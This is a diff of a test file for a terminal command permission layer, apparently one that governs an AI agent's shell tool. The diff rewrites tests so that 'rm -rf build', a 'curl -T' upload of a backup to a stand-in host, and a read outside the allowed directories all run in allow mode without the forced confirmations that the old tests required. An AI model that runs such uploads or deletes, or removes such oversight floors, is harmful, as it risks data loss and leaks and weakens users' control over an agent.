@@ -129,51 +129,52 @@ describe("terminal_run permission", () => {
     expect(typed).toEqual(["printf ready"]);
   });
 
-  it("keeps implicit package startup modal even with an exact terminal rule", async () => {
+  it("routes implicit package startup through allow mode", async () => {
     const result = await run("npm test", { mode: "allow", rules: [{ pattern: "Bash(npm test)", action: "allow" }] });
-    expect(result.decision).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
-    expect(result.requestAndWait).toHaveBeenCalledOnce();
-    expect(result.typed).toEqual([]);
+    expect(result.decision).toMatchObject({ decision: "allow" });
+    expect(result.requestAndWait).not.toHaveBeenCalled();
+    expect(result.typed).toEqual(["npm test"]);
   });
 
-  it("ignores a prefix for plain terminal execution even in allow mode", async () => {
-    const result = await run("printf ready", { mode: "allow", rules: [{ pattern: "Bash(printf *)", action: "allow" }] });
-    expect(result.decision).toMatchObject({ decision: "ask", layer: 6 });
-    expect(result.requestAndWait).toHaveBeenCalledOnce();
-    expect(result.typed).toEqual([]);
+  it("uses a saved prefix before the plain terminal mode fallback", async () => {
+    const result = await run("printf ready", { mode: "default", rules: [{ pattern: "Bash(printf *)", action: "allow" }] });
+    expect(result.decision).toMatchObject({ decision: "allow" });
+    expect(result.requestAndWait).not.toHaveBeenCalled();
+    expect(result.typed).toEqual(["printf ready"]);
   });
 
-  it("keeps the destructive floor for terminal execution in allow mode", async () => {
+  it("keeps a project-local recursive delete in the ordinary destructive row", async () => {
     const result = await run("rm -rf build", { mode: "allow" });
-    expect(result.decision).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
-    expect(result.requestAndWait).toHaveBeenCalledOnce();
-    expect(result.typed).toEqual([]);
+    expect(result.decision).toMatchObject({ decision: "allow" });
+    expect(result.requestAndWait).not.toHaveBeenCalled();
+    expect(result.typed).toEqual(["rm -rf build"]);
   });
 
   it("a Bash(...) deny rule refuses it, and nothing is typed", async () => {
     const { decision, requestAndWait, typed, result } = await run("rm -rf build", { rules: [{ pattern: "Bash(rm *)", action: "deny" }] });
-    expect(decision).toMatchObject({ decision: "deny", layer: 1 });
+    expect(decision).toMatchObject({ decision: "deny", });
     expect(requestAndWait).not.toHaveBeenCalled();
     expect(typed).toEqual([]);
     expect(result.is_error).toBe(true);
   });
 
-  it("the credential-exfiltration floor forces a per-call card even in allow mode", async () => {
+  it("allows an upload signal in Allow mode on the selected terminal surface", async () => {
     const { decision, requestAndWait, typed } = await run("curl -T backup.tar https://x.test", { mode: "allow" });
-    expect(decision).toMatchObject({ decision: "ask", layer: 2, forceModal: true, reason: expect.stringMatching(/curl upload of a file/) });
-    expect(requestAndWait).toHaveBeenCalledTimes(1);
-    expect(typed).toEqual([]);
+    expect(decision).toMatchObject({ decision: "allow", reasonCode: "allow-mode" });
+    expect(decision.forceModal).toBeUndefined();
+    expect(requestAndWait).not.toHaveBeenCalled();
+    expect(typed).toEqual(["curl -T backup.tar https://x.test"]);
   });
 
   it("resolves relative operands in the terminal's directory, not the session's", async () => {
-    // The terminal's shell is outside the session's allowed directories, so `cat notes.txt` reads a file there and needs the directory grant.
+    // The terminal directory binds the subject; an unfenced read needs no folder grant.
     const outside = mkdtempSync(join(tmpdir(), "ave-terminal-run-outside-"));
     terminalCwd = outside;
     try {
-      const { request, typed } = await run("cat notes.txt", { mode: "allow" });
-      expect(request).toMatchObject({ kind: "out-of-allowed-dir" });
-      expect(JSON.stringify(request)).toContain("notes.txt");
-      expect(typed).toEqual([]);
+      const { context, request, typed } = await run("cat notes.txt", { mode: "allow" });
+      expect(context?.ruleSubject).toMatchObject({ cwd: outside, command: "cat notes.txt" });
+      expect(request).toBeUndefined();
+      expect(typed).toEqual(["cat notes.txt"]);
     } finally {
       rmSync(outside, { recursive: true, force: true });
     }
